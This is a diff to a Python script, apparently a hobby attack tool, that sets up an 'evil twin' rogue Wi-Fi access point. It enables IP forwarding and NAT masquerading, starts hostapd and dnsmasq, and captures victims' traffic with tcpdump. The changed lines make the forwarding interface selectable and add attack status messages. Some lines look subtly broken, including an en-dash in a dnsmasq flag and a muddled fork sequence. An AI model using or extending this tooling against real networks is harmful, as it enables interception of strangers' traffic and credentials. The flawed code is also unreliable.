@@ -74,10 +74,15 @@ def get_target(interface):
 def evil_twix(interface, target):
 
     # Allow forwarding and put interface in ip tables
+    print("\nIp forwarding activation ...")
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-    os.system("iptables -I POSTROUTING -t nat -o wlan0 -j MASQUERADE")
+
+    print("\nWe will need the interface to use for ip forwarding")
+    interface_fwd = get_interfaces()
+    os.system("iptables -I POSTROUTING -t nat -o %s -j MASQUERADE" % interface_fwd)
     
     # Copy the templates in the working directory
+    print("\n Config file creation ...")
     os.system("cp template/template_dnsmasq.conf dnsmasq.conf")
     os.system("cp template/template_hostapd.conf hostapd.conf")
 
@@ -91,12 +96,14 @@ def evil_twix(interface, target):
     hostapd = os.fork()
     dnsmasq = os.fork()
 
+    print("\nStarting the attack ...")
+
     if dnsmasq:
         os.system("dnsmasq -d –C dnsmasq.conf")
     elif hostapd:
         os.system("hostapd hostapd.conf")
     else:
-        os.system("wireshark -i %s -w test.pcap" % interface)
+        os.system("tcpdump -s 0 -i %s -w test.pcap" % interface)
 
 if __name__ == "__main__":
     
